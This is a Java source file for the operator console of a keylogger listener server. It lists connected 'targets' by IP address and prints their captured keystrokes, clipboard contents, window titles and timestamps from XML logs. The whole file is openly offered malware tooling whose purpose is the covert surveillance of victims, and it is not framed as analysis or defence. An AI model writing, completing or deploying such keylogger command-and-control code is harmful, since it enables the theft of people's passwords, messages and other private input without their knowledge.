/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package keyloggerinterface;
import java.awt.Frame;
import java.io.File;
import java.io.IOException;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;


/**
 *
 * @author Qu3b411
 */

public class KeyLoggerInterface extends Frame{

    public class keylogdata
    {
            long IPaddress;
            String Fname;
            private keylogdata(long a, String b)
            {
                IPaddress = a;
                Fname=b;
               // System.out.printf("here  %d \n",  IPaddress);
            }
    }    
    public native void setConsoleColorDefault();
    public native void setConsoleColorCaptureInformationCB();
    public native void setConsoleColorProcessInformation();
    public native void setConsoleColorTitleInformation();
    public native void setConsoleColorCaptureInformationKL();
    public native keylogdata[] getBuffer();
    
    private keylogdata[] connections;

    public void raiseConsole()
    {
        
    }
    Scanner command = new Scanner(System.in);
    String commandStore;
    public  void Console()
    {
        System.out.print("\n\nJava Interface Initiated, starting the command terminal for"
                + " the keylogger  V0.1.2\n"
                + "to see a list of commands available,type 'help'\n\n");
        while (true)
        {
            System.out.print("KeyLogger_V0.1.2\\Command> ");
            commandStore = command.nextLine();
           
            switch( commandStore.split(" ")[0])
            {
                case "display":
                     System.out.println("listing connected ip addresses to the screen\n");
                     connections = getBuffer();
                     System.out.printf("[*] Connected Targets: %d\n\tID#\tIP ADDRESS\t\tASSOCIATED LOG FILE \n", connections.length);
                     for (int x=0; x<connections.length;x++) {
                         keylogdata tmp1 = connections[x];
                         System.out.printf("\t[*]%d\t%d.%d.%d.%d\t\t%s\n",x, (0xff000000 & tmp1.IPaddress)>>24,
                                                                     (0x00ff0000 & tmp1.IPaddress)>>16,
                                                                     (0x0000ff00 & tmp1.IPaddress)>> 8,
                                                                     (0x000000ff & tmp1.IPaddress)    ,
                                                                     tmp1.Fname);
                     }
                break;
                case "dump":
                    if (commandStore.split(" ").length < 2)
                    {
                        System.err.println("invaild option: \n\n\tusage: dump <ID#>\n\nplease provide the identifier of the log you are trying to access\n"
                                + "to see the id of all connected use the 'display' command");
                        break;
                    }
                    int id;
                    try
                    {
                         id = Integer.parseInt(commandStore.split(" ")[1]);
                         if(connections == null || id<0 || id>connections.length-1 )
                         {
                             System.err.println("the id you provided is invalid, to get the id# of connected targets run the 'display' command!");
                             break;
                         }
                    }   
                    catch ( NumberFormatException e)
                    { 
                        System.err.println("invaild option: \n\n\tusage: dump <ID#>\n\nplease provide the identifier of the log you are trying to access\n"
                                + "to see the id of all connected use the 'display' command.\n\n example:\n\tdump 3");
                        break;
                    }
                    File f;
                  f = new File(connections[id].Fname);
                  Document doc;
                try {
                    doc = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(f);
                    Element element = doc.getDocumentElement();
                    if(element != null)
                    {
                        NodeList nodes = element.getChildNodes();
                        for(int x=0; x<nodes.getLength(); x++)
                        {
                            if(nodes.item(x).getNodeName().compareTo("#text")!=0)
                            {
                              NodeList ProcessNodes = nodes.item(x).getChildNodes();
                              for(int y=0; y<ProcessNodes.getLength(); y++)
                              {
                                   if(ProcessNodes.item(y).getNodeName().compareTo("ProcessHandle")==0)
                                    {
                                        setConsoleColorProcessInformation();
                                        System.out.print("Process Handle: "+ProcessNodes.item(y).getTextContent());
                                        setConsoleColorDefault();
                                    }
                                   else if(ProcessNodes.item(y).getNodeName().compareTo("ProcessID")==0)
                                    {
                                        setConsoleColorProcessInformation();
                                        System.out.println("\tProcess ID: "+ProcessNodes.item(y).getTextContent());
                                        setConsoleColorDefault();
                                    }
                                   else if(ProcessNodes.item(y).getNodeName().compareTo("title")==0)
                                    {
                                        System.out.print("\n");
                                        NodeList TitleList = ProcessNodes.item(y).getChildNodes();
                                        for(int z=0; z<TitleList.getLength(); z++)
                                        {
                                            if(TitleList.item(z).getNodeName().compareTo("ProcessTitle")==0)
                                            {
                                                
                                                 setConsoleColorTitleInformation();
                                                System.out.print("Title: "+TitleList.item(z).getTextContent());
                                                 setConsoleColorDefault();
                                            }
                                            else if(TitleList.item(z).getNodeName().compareTo("TimeStamp")==0)
                                            {
                                                
                                                 setConsoleColorTitleInformation();
                                                 System.out.println("Time Stamp: "+TitleList.item(z).getTextContent());
                                                 setConsoleColorDefault();
                                            }
                                            else if (TitleList.item(z).getNodeName().compareTo("logged")==0)
                                            {
                                                 NodeList LoggedList = TitleList.item(z).getChildNodes();
                                                 
                                                 for(int x1=0; x1<LoggedList.getLength();x1++)
                                                 {
                                                     if (LoggedList.item(x1).getNodeName().compareTo("CaptureType")==0)
                                                     {
                                                         if(LoggedList.item(x1).getTextContent().compareTo("Keylogger")==0)
                                                         {
                                                             setConsoleColorCaptureInformationKL();
                                                         }
                                                         else if(LoggedList.item(x1).getTextContent().compareTo("ClipBoard")==0)
                                                         {
                                                             setConsoleColorCaptureInformationCB();
                                                         }
                                                         System.out.println(LoggedList.item(x1).getTextContent());
                                                     }
                                                     else if (LoggedList.item(x1).getNodeName().compareTo("Capture")==0)
                                                     {
                                                         
                                                         System.out.println("\n"+LoggedList.item(x1).getTextContent()); 
                                                         setConsoleColorDefault();
                                                     }
                                                 }
                                                
                                            }
                                        }
                                        
                                    }
                              }
                            }
                        }
                        System.out.println("\nSuccess\n");
                    }
                    else
                    {
                        System.out.println("\nfailde\n");
                    }
                } catch (SAXException | IOException | ParserConfigurationException ex) {
                    Logger.getLogger(KeyLoggerInterface.class.getName()).log(Level.SEVERE, null, ex);
                }
                    setConsoleColorProcessInformation();
                   
                    setConsoleColorDefault();
          
                    //logic goes here to dump the log of a specified IP address
               
                    
                break;
                case "":
                break;
                case "help":
                    System.out.print("\nWelcome to the Keylogger listener server.\nThis server is curently listening for connections from your targets"
                            + "\n\nCommand\t\t\tDescription\n"
                            + "[*] display\t\tdisplays all ip addresses currently connected as well as\n\t\t\ttheir associated log files\n\n"
                            + "[*] dump <ID#>\tthe dump command will display the contents of an\n\t\t\txml file as it is at this point in time!\n\n"
                            + "[*] help \t\tdisplays this help message\n\n"
                            + "[*] gui  \t\tRaises the servers Gui and returns out of the console window\n\n");
                break;
                case "gui":
                    break;
                default:
                    System.out.println("invalid command\n");
                break;
                    
                      
            }
        }
      
    
    }
}
